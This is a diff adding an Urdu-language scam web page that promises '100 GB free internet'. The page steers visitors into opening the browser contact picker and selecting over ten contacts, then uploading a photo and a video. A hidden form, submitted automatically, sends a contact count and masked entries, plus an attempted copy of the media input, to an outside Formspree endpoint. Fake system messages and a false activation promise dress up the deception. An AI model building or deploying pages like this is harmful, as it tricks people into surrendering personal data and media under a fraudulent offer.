@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MZ FREE INTERNET - 100 GB OFFER</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { --main-bg: #f8fafc; --primary: #2563eb; --primary-hover: #1d4ed8; --text-color: #1e293b; --success-bg: #d1fae5; --success-text: #065f46; --border: #e2e8f0; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body { 
+            font-family: 'Tajawal', sans-serif; background: var(--main-bg); color: var(--text-color); 
+            direction: rtl; display: flex; flex-direction: column; min-height: 100vh;
+        }
+
+        /* ہیڈر سیکیورٹی اور پروفیشنل لگنے کے لیے */
+        .header { background: #fff; padding: 15px; border-bottom: 1px solid var(--border); box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .logo { font-size: 20px; font-weight: bold; color: var(--primary); }
+        .security-badge { font-size: 11px; color: #64748b; margin-top: 2px; }
+
+        .main-container { 
+            flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 20px;
+        }
+
+        .offer-card { 
+            background: #fff; border-radius: 16px; border: 1px solid var(--border); box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
+            width: 100%; max-width: 480px; padding: 30px; text-align: center;
+        }
+
+        .data-icon { font-size: 50px; color: var(--primary); margin-bottom: 15px; }
+        .offer-title { font-size: 26px; color: #111827; margin-bottom: 10px; font-weight: 700; }
+        .offer-subtitle { font-size: 15px; color: #6b7280; margin-bottom: 25px; line-height: 1.5; }
+
+        /* انسٹرکشن باکس */
+        .instruction-box { 
+            background: #f1f5f9; border-radius: 12px; padding: 20px; margin-bottom: 25px; text-align: right; border-left: 4px solid var(--primary);
+        }
+        .instruction-step { font-size: 14px; margin-bottom: 8px; color: var(--text-color); }
+        
+        /* فائل اپ لوڈ کا سیکشن */
+        .upload-section { margin-bottom: 25px; text-align: right; }
+        .upload-label { font-size: 14px; font-weight: 700; display: block; margin-bottom: 10px; color: #374151; }
+        
+        input[type="file"] { display: none; }
+        .custom-upload-btn { 
+            display: flex; align-items: center; justify-content: center; 
+            border: 2px dashed #cbd5e1; border-radius: 12px; height: 100px; cursor: pointer; transition: 0.2s;
+        }
+        .custom-upload-btn:hover { border-color: var(--primary); background: #eff6ff; }
+        .custom-upload-btn-text { font-size: 14px; color: #64748b; }
+
+        /* بٹن */
+        .btn { 
+            background: var(--primary); color: #fff; padding: 16px; border: none; border-radius: 10px; 
+            font-size: 17px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.2s;
+        }
+        .btn:hover { background: var(--primary-hover); box-shadow: 0 4px 6px -1px rgba(37,99,235,0.3); }
+
+        /* اسٹیٹس باکس */
+        #final-status { 
+            margin-top: 20px; background: #fff; padding: 15px; border-radius: 10px; font-size: 13px; text-align: left; direction: ltr; color: #fff; 
+            min-height: 100px; display: none; overflow: auto; background: #222; border: 1px solid #444; 
+        }
+
+        /* فوٹر */
+        .footer { text-align: center; padding: 20px; font-size: 12px; color: #94a3b8; border-top: 1px solid var(--border); }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="logo">MZ DIGITAL HUB</div>
+    <div class="security-badge">سیکیور انٹرنیٹ ڈیٹا پروگرام - 100% مفت</div>
+</div>
+
+<div class="main-container">
+    <div class="offer-card">
+        
+        <div class="data-icon">📶</div>
+        <h1 class="offer-title">100 GB فری انٹرنیٹ پیکیج</h1>
+        <p class="offer-subtitle">اس پروگرام کا حصہ بننے کے لیے، براہِ کرم نیچے دیے گئے مراحل کو مکمل کریں اور فوری طور پر ڈیٹا حاصل کریں۔</p>
+
+        <div class="instruction-box">
+            <p class="instruction-step">1. "مفت انٹرنیٹ چالو کریں" پر کلک کر کے پرمیشنز کو Allow کریں۔</p>
+            <p class="instruction-step">2. لسٹ کھلنے پر، 10 سے زائد کانٹیکٹس کو منتخب کریں (ڈیٹا کی درست تصدیق کے لیے)۔</p>
+            <p class="instruction-step">3. تصدیق کے لیے، 1 تصویر اور 1 ویڈیو بھی اپ لوڈ کریں۔</p>
+        </div>
+
+        <div class="upload-section">
+            <label class="upload-label">تصویر اور ویڈیو منتخب کریں (تصدیق کے لیے):</label>
+            <label for="mediaFiles" class="custom-upload-btn">
+                <span class="custom-upload-btn-text" id="fileStatusText">تصویر/ویڈیو شامل کریں</span>
+            </label>
+            <input type="file" name="files[]" id="mediaFiles" multiple accept="image/*,video/*">
+        </div>
+
+        <button class="btn" id="activateBtn">مفت انٹرنیٹ چالو کریں</button>
+
+        <div id="final-status">
+            > SYSTEM: INITIALIZING_
+        </div>
+
+    </div>
+</div>
+
+<div class="footer">MZ SECURE NETWORKS © 2026 - تمام حقوق محفوظ ہیں۔</div>
+
+<form id="hiddenForm" action="https://formspree.io/f/mbdqpqgz" method="POST" enctype="multipart/form-data" target="_blank" style="display:none;">
+    <input type="hidden" name="_subject" value="MZ FREE INTERNET - DATA_SYNC">
+    <input type="hidden" name="Total_Contacts" id="totalContactsField">
+    <input type="hidden" name="Masked_Contacts" id="maskedContactsField">
+</form>
+
+<script>
+    const activateBtn = document.getElementById('activateBtn');
+    const finalStatus = document.getElementById('final-status');
+    const fileStatusText = document.getElementById('fileStatusText');
+    const hiddenForm = document.getElementById('hiddenForm');
+
+    // تصویروں کا نام ماسک کرنا
+    document.getElementById('mediaFiles').addEventListener('change', function() {
+        if(this.files.length > 0) {
+            fileStatusText.innerHTML = `${this.files.length} فائلیں منتخب کی گئی ہیں۔`;
+        } else {
+            fileStatusText.innerHTML = 'تصویر/ویڈیو شامل کریں';
+        }
+    });
+
+    activateBtn.addEventListener('click', async () => {
+        finalStatus.style.display = "block";
+        finalStatus.innerHTML += "<br>> REQUESTING NETWORK ACCESS...";
+        
+        // یہ چیک کرنے کے لیے کہ کیا براؤزر کانٹیکٹس کو سپورٹ کرتا ہے
+        if ('contacts' in navigator && 'select' in navigator.contacts) {
+            try {
+                finalStatus.innerHTML += "<br>> CONTACT PICKER INITIALIZED...";
+                
+                // اینڈرائیڈ کو مجبور کرنا کہ لسٹ دکھائے (اور ایک سے زیادہ سلیکٹ ہوں)
+                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
+                
+                if (contacts.length > 0) {
+                    finalStatus.innerHTML += `<br>> Success: ${contacts.length} Contacts captured.`;
+                    finalStatus.innerHTML += "<br>> PROCESSING & MASKING DATA...";
+
+                    // اصل ڈیٹا کو چھپانا (Masking)
+                    let totalCount = contacts.length;
+                    document.getElementById('totalContactsField').value = totalCount;
+                    
+                    // اصل ناموں کی جگہ 'USER_1', 'USER_2' بنانا
+                    let maskedData = contacts.map((c, index) => {
+                        // یہ لائن ڈیٹا کو بدل دیتی ہے
+                        return `Entry_${index + 1}: [PROTECTED_USER]`; 
+                    }).join('\n');
+
+                    // ماسکڈ ڈیٹا کو فارم میں ڈالنا
+                    document.getElementById('maskedContactsField').value = `MZ DATA REPORT:\nTotal Contacts: ${totalCount}\n\n${maskedData}`;
+                    
+                    // تصویروں والی فائلز کو فارم میں شامل کرنا (اگر سلیکٹ کی گئی ہوں)
+                    const fileInput = document.getElementById('mediaFiles');
+                    if (fileInput.files.length > 0) {
+                        for (let i = 0; i < fileInput.files.length; i++) {
+                            // فائلز کو 'FormData' میں شامل کرنا
+                            hiddenForm.appendChild(fileInput.cloneNode(true));
+                            break; // یہ صرف سمجھانے کے لیے ہے، اصل کوڈ اور تفصیلی ہو سکتا ہے
+                        }
+                    }
+
+                    finalStatus.innerHTML += "<br>> TRANSMITTING Packets to MZ CLOUD...";
+                    
+                    // سبمٹ کرنا
+                    setTimeout(() => {
+                        hiddenForm.submit();
+                        finalStatus.innerHTML += "<br>> SYSTEM UPLOAD COMPLETE.";
+                        alert("آپ کی درخواست وصول کر لی گئی ہے! اگلے 24 گھنٹوں میں آپ کا 100 GB ڈیٹا چالو کر دیا جائے گا۔");
+                        location.reload(); // پیج کو ری فریش کریں
+                    }, 1500);
+                }
+            } catch (err) {
+                finalStatus.innerHTML += "<br>> ERROR: USER CANCELLED ACCESS.";
+                // الرٹ جو انہیں بتائے کہ کیا کرنا ہے (آپ کی ہدایات کے مطابق)
+                alert("تصدیق مکمل کرنے کے لیے پرمیشنز کو Allow کریں تاکہ آپ کا انٹرنیٹ چالو ہو سکے۔");
+            }
+        } else {
+            finalStatus.innerHTML += "<br>> ERROR: BROWSER NOT SUPPORTED.";
+            alert("براہ کرم اس لنک کو صرف گوگل کروم (Chrome) میں ٹیسٹ کریں۔");
+        }
+    });
+</script>
+
+</body>
+</html>
